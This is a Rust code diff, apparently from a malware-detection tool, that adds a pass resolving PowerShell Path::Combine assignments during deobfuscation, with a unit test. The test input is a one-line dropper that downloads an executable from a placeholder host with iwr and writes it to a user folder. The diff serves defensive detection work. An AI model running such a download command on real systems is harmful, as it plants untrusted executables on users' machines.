@@ -147,6 +147,14 @@ static PS_ANY_STRING_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_PATH_COMBINE_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\[(?:System\.)?IO\.Path\]::Combine\s*\(\s*([^,\r\n;]{1,512})\s*,\s*(?:'([^']{1,255})'|"([^"]{1,255})")\s*\)"#,
+    )
+    .expect("ps path combine assign regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_EMPTY_REPLACE_OPERATOR_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?is)-replace\s*['"]([^'"]{1,128})['"]\s*,\s*['"]{2}"#)
         .expect("ps empty replace operator regex")
@@ -3091,14 +3099,85 @@ fn expand_ps_variables(text: &str) -> String {
     out
 }
 
+fn expand_ps_path_combine_assignments(text: &str) -> String {
+    if !contains_ascii_case_insensitive(text, "path]::combine") {
+        return text.to_string();
+    }
+
+    let matches: Vec<(usize, usize, String)> = PS_PATH_COMBINE_ASSIGN_RE
+        .captures_iter(text)
+        .filter_map(|caps| {
+            let full = caps.get(0)?;
+            let name = caps.get(1)?.as_str();
+            let base = clean_ps_path_combine_part(caps.get(2)?.as_str())?;
+            let leaf = clean_ps_path_combine_part(
+                caps.get(3)
+                    .or_else(|| caps.get(4))
+                    .map(|m| m.as_str())
+                    .unwrap_or_default(),
+            )?;
+            let joined = join_windows_path(&base, &leaf)?;
+            Some((full.start(), full.end(), format!("${name}='{}'", joined)))
+        })
+        .collect();
+    if matches.is_empty() {
+        return text.to_string();
+    }
+    let mut out = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        out.replace_range(start..end, &replacement);
+    }
+    out
+}
+
+fn clean_ps_path_combine_part(part: &str) -> Option<String> {
+    let trimmed = part
+        .trim()
+        .trim_matches(['"', '\''])
+        .trim_end_matches([')', ' ']);
+    if trimmed.is_empty()
+        || trimmed.contains('$')
+        || trimmed.contains('`')
+        || trimmed.contains('\r')
+        || trimmed.contains('\n')
+        || trimmed.contains(';')
+    {
+        return None;
+    }
+    Some(trimmed.to_string())
+}
+
+fn join_windows_path(base: &str, leaf: &str) -> Option<String> {
+    if base.is_empty() || leaf.is_empty() {
+        return None;
+    }
+    if leaf.contains(':') || leaf.starts_with(['\\', '/']) {
+        return Some(leaf.replace('/', "\\"));
+    }
+    let mut joined = base.trim_end_matches(['\\', '/']).replace('/', "\\");
+    joined.push('\\');
+    joined.push_str(&leaf.replace('/', "\\"));
+    Some(joined)
+}
+
 #[cfg(test)]
 mod ps_variables_prefilter_tests {
-    use super::expand_ps_variables;
+    use super::{expand_ps_path_combine_assignments, expand_ps_variables};
 
     #[test]
     fn ignores_text_without_assignment_shape() {
         let text = "Write-Host hello world";
         assert_eq!(expand_ps_variables(text), text);
+    }
+
+    #[test]
+    fn expands_path_combine_assignment_with_literal_leaf() {
+        let text = r#"$filePath1 = [System.IO.Path]::Combine(C:\Users\puncher, 'qdll.exe'); iwr https://x.example/qz.exe -OutFile $filePath1"#;
+        let expanded = expand_ps_path_combine_assignments(text);
+        assert!(
+            expanded.contains(r#"$filePath1='C:\Users\puncher\qdll.exe'"#),
+            "expanded: {expanded}"
+        );
     }
 }
 
@@ -4124,6 +4203,7 @@ fn expand_obfuscation(text: &str) -> String {
         out = expand_ps_replace(&out);
         out = expand_ps_dot_replace(&out);
         out = expand_ps_index_concat_assignments(&out);
+        out = expand_ps_path_combine_assignments(&out);
         out = expand_ps_variables(&out);
         out = expand_regex_replace_calls(&out);
         out = expand_getstring_base64_variables(&out);
